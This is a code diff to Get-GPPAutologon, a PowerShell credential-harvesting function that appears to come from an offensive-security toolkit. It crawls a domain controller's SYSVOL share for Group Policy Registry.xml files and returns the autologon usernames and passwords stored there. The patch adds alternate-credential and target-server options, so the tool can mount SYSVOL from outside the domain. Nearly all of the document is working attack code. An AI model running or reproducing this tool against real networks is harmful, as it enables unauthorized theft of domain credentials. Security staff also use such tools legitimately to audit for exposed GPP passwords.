@@ -11,19 +11,28 @@ function Get-GPPAutologon
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
- 
+
+.PARAMETER Server
+
+    Specifies an Active Directory server (domain controller) to bind to.
+    Default's to the users current domain controller.
+
+.PARAMETER Credential
+
+    A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain.
+
 .DESCRIPTION
 
-    Get-GPPAutologn searches the domain controller for registry.xml to find autologon information and returns the username and password.
+    Get-GPPAutologon searches the domain controller for registry.xml to find autologon information and returns the username and password.
 
 .EXAMPLE
 
     PS C:\> Get-GPPAutolgon
     
-    UserNames                                    File                                         Passwords                                  
-    ---------                                    ----                                         ---------                                  
-    {administrator}                              \\ADATUM.COM\SYSVOL\Adatum.com\Policies\{... {PasswordsAreLam3}                    
-    {NormalUser}                                 \\ADATUM.COM\SYSVOL\Adatum.com\Policies\{... {ThisIsAsupaPassword}                    
+    UserNames              File                                         Passwords
+    ---------              ----                                         ---------
+    {administrator}        \\ADATUM.COM\SYSVOL\Adatum.com\Policies\{... {PasswordsAreLam3}
+    {NormalUser}           \\ADATUM.COM\SYSVOL\Adatum.com\Policies\{... {ThisIsAsupaPassword}
 
 
 .EXAMPLE
@@ -38,13 +47,26 @@ function Get-GPPAutologon
     read123
     Recycling*3ftw!
 
+.EXAMPLE
+
+    PS C:\> Get-GPPAutologon -Server DC01.example.domain -Credential example.domain\testuser
+
 .LINK
     
     https://support.microsoft.com/nb-no/kb/324737
 #>
     
     [CmdletBinding()]
-    Param ()
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [Alias('DomainController')]
+        [String]
+        $Server = $($ENV:LOGONSERVER -replace '\\',''),
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
     
     #Some XML issues between versions
     Set-StrictMode -Version 2
@@ -52,14 +74,13 @@ function Get-GPPAutologon
     #define helper function to parse fields from xml files
     function Get-GPPInnerFields 
     {
-    [CmdletBinding()]
+        [CmdletBinding()]
         Param (
             $File 
         )
     
         try 
         {
-            $Filename = Split-Path $File -Leaf
             [xml] $Xml = Get-Content ($File)
 
             #declare empty arrays
@@ -83,11 +104,10 @@ function Get-GPPAutologon
                         {
                             $Username += , $prop | Select-Object -ExpandProperty Value
                         }
-                }
-
+                    }
                     Write-Verbose "Potential password in $File"
                 }
-                         
+
                 #put [BLANK] in variables
                 if (!($Password)) 
                 {
@@ -109,31 +129,44 @@ function Get-GPPAutologon
                 if ($ResultsObject)
                 {
                     Return $ResultsObject
-                } 
+                }
             }
         }
-        catch {Write-Error $Error[0]}
+        catch {Write-Error $_}
     }
 
     try {
-        #ensure that machine is domain joined and script is running as a domain account
-        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
-            throw 'Machine is not a domain member or User is not a member of the domain.'
+        $PATH="\\$Server\SYSVOL"
+        # connect to domain controller
+        if ($PSBoundParameters['Credential']) {
+            $DRIVE = New-PSDrive -Name DC -PSProvider FileSystem -Root \\$Server\SYSVOL -Credential $Credential -Scope global
+            $PATH="DC:\*"
+            if( -not $DRIVE ){throw 'Could not connect to domain controller.'}
+        } else {
+            if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
+                throw 'Machine is not a domain member or User is not a member of the domain.'
+            }
         }
-    
+
         #discover potential registry.xml containing autologon passwords
-        Write-Verbose 'Searching the DC. This could take a while.'
-        $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Registry.xml'
+        Write-Host 'Searching the DC. This could take a while.'
+        $XMlFiles = Get-ChildItem -Path $PATH -Recurse -ErrorAction SilentlyContinue -Include 'Registry.xml'
     
         if ( -not $XMlFiles ) {throw 'No preference files found.'}
 
         Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
     
         foreach ($File in $XMLFiles) {
-                $Result = (Get-GppInnerFields $File.Fullname)
-                Write-Output $Result
+            $Result = (Get-GppInnerFields $File.Fullname)
+            Write-Output $Result
         }
+
+        if ($PSBoundParameters['Credential']) {
+            Remove-PSDrive DC
+        }
+
+        Write-Host "Done."
     }
 
-    catch {Write-Error $Error[0]}
+    catch {Write-Error $_}
 }
